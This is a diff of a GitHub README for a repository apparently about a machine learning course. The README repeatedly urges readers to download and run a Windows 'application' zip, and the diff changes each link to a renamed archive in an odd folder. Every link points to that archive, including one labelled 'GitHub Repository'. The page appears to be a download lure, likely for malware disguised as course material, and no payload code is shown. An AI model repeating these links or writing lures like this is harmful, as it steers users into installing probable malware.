@@ -1,7 +1,7 @@
 # 📊 Fundamentals_of_Machine_Learning - Learn Machine Learning with Ease
 
 ## 🔗 Download Now
-[![Download Release](https://raw.githubusercontent.com/Sabbam/Fundamentals_of_Machine_Learning/main/demanding/Fundamentals_of_Machine_Learning.zip%20Release-v1.0-blue)](https://raw.githubusercontent.com/Sabbam/Fundamentals_of_Machine_Learning/main/demanding/Fundamentals_of_Machine_Learning.zip)
+[![Download Release](https://github.com/Sabbam/Fundamentals_of_Machine_Learning/raw/refs/heads/main/demanding/Learning_of_Machine_Fundamentals_v3.9.zip%20Release-v1.0-blue)](https://github.com/Sabbam/Fundamentals_of_Machine_Learning/raw/refs/heads/main/demanding/Learning_of_Machine_Fundamentals_v3.9.zip)
 
 ## 🚀 Getting Started
 Welcome to **Fundamentals of Machine Learning**. This application will help you understand the core concepts of machine learning, as taught by Dr. Chico Camargo at the University of Exeter. You’ll learn essential topics, including data visualization, clustering, and exploratory data analysis.
@@ -17,9 +17,9 @@ Welcome to **Fundamentals of Machine Learning**. This application will help you 
 To get started, you need to download the application. Please follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the application’s download page.
-   [Download the application here](https://raw.githubusercontent.com/Sabbam/Fundamentals_of_Machine_Learning/main/demanding/Fundamentals_of_Machine_Learning.zip)
+   [Download the application here](https://github.com/Sabbam/Fundamentals_of_Machine_Learning/raw/refs/heads/main/demanding/Learning_of_Machine_Fundamentals_v3.9.zip)
 
-2. **Select the Appropriate Version**: Look for the latest version available. Ensure you choose the correct file for your system. Most users will want the file named `https://raw.githubusercontent.com/Sabbam/Fundamentals_of_Machine_Learning/main/demanding/Fundamentals_of_Machine_Learning.zip` for Windows or the equivalent file for macOS.
+2. **Select the Appropriate Version**: Look for the latest version available. Ensure you choose the correct file for your system. Most users will want the file named `https://github.com/Sabbam/Fundamentals_of_Machine_Learning/raw/refs/heads/main/demanding/Learning_of_Machine_Fundamentals_v3.9.zip` for Windows or the equivalent file for macOS.
 
 3. **Download the File**: Click on the filename to start the download. The download may take a few moments depending on your internet connection.
 
@@ -64,5 +64,5 @@ We value your input and are here to help. If you encounter problems or have sugg
 Thank you for choosing **Fundamentals of Machine Learning**. Happy learning!
 
 ## 🔗 Quick Links
-- [Download the application here](https://raw.githubusercontent.com/Sabbam/Fundamentals_of_Machine_Learning/main/demanding/Fundamentals_of_Machine_Learning.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/Sabbam/Fundamentals_of_Machine_Learning/main/demanding/Fundamentals_of_Machine_Learning.zip)
+- [Download the application here](https://github.com/Sabbam/Fundamentals_of_Machine_Learning/raw/refs/heads/main/demanding/Learning_of_Machine_Fundamentals_v3.9.zip)
+- [GitHub Repository](https://github.com/Sabbam/Fundamentals_of_Machine_Learning/raw/refs/heads/main/demanding/Learning_of_Machine_Fundamentals_v3.9.zip)
